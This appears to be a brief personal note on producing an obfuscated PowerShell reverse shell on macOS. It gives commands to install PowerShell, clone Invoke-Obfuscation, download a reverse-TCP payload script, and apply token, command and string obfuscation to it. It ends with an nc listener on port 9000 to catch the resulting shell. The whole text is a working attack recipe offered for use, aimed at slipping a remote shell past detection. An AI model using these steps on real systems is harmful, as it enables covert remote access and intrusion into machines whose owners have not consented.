
Use powershell on Mac (on Windows it's quite a hassle).

Install powershell on mac & Invoke-Obfuscation: 
```
brew install --cask powershell
cd ~/Tools
git clone https://github.com/danielbohannon/Invoke-Obfuscation
wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/invoke_expression/original/powershell_reverse_tcp.ps1
```


Use Invoke-Obfuscation:
```
cd ~/tools/Invoke-Obfuscation
pwsh
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Encode script:
```
SET SCRIPTPATH ~/tools/powershell_reverse_tcp.ps1
TOKEN

COMMENT
1
BACK

Type
2
BACK

Argument
4
BACK

Command
3
BACK

String
2
BACK
```

You can test with:
```
#new window:
nc -lv 9000
#in the invoke powershell menu:
TEST
```
This should spawn a shell.



